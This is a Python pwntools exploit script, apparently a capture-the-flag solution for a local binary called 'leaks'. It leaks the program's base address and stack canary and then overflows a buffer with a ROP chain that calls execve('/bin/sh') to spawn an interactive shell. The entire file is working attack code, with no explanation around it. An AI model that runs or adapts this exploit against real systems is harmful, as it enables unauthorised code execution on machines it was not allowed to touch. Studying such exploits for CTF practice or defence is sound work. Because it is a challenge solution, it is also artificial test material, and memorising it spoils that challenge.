#!/usr/bin/env python3
from pwn import *  # NOQA
import os
import sys

context.arch = 'amd64'
# context.log_level = 'debug'

if os.getenv("TMUX"):
    context.terminal = "tmux splitw -h".split()
else:
    context.terminal = "kitty sh -c".split()

debug = "--debug" in sys.argv
is_remote = "--remote" in sys.argv

host = "localhost"
port = 1009
binary_path = "./leaks"
libc_path = None

if is_remote:
    p = remote(host, port)
else:
    p = process(binary_path)

    if debug:
        gdb.attach(p, '''

        ''')

if libc_path:
    libc = ELF(libc_path)

binary = ELF(binary_path)

p.sendline(b'8')
p.sendline(b'/bin/sh\x00')

p.recvline()

p.sendline(b'8')
p.send(b'A' * 8 + b'\x0a')
p.recvline()
addr_leak = u64((b'\x00' + p.recvline()[0:5]).ljust(8, b'\x00'))
base = addr_leak - binary.symbols['_start']
print(hex(base))

p.sendline(b'24')
p.send(b'A' * 24 + b'\x0a')
p.recvline()

leak = u64(b'\x00' + p.recvline()[:7])
print(hex(leak))

# # Build Ropchain # #

rop = ROP(binary)

name_addr = base + binary.symbols['name']
pop_rsi_pop_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address + base
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address + base
pop_rax_syscall = rop.find_gadget(['pop rax', 'syscall']).address + base


ropchain = b''
# clear rsi
ropchain += p64(pop_rsi_pop_r15)  # pop rsi; pop r15, ret
ropchain += p64(0)  # rsi
ropchain += p64(0)  # r15

# set rdi addr("/bin/sh")
ropchain += p64(pop_rdi)  # pop rdi; ret
ropchain += p64(name_addr)  # rdi

# syscall
ropchain += p64(pop_rax_syscall)  # pop rax; syscall
ropchain += p64(59)  # rax (sys_execve)

p.sendline(str(40 + len(ropchain)))
p.send(b'A' * 24 + p64(leak) + b'BBBBBBBB' + ropchain + b'\x0a' * 100)

p.interactive()
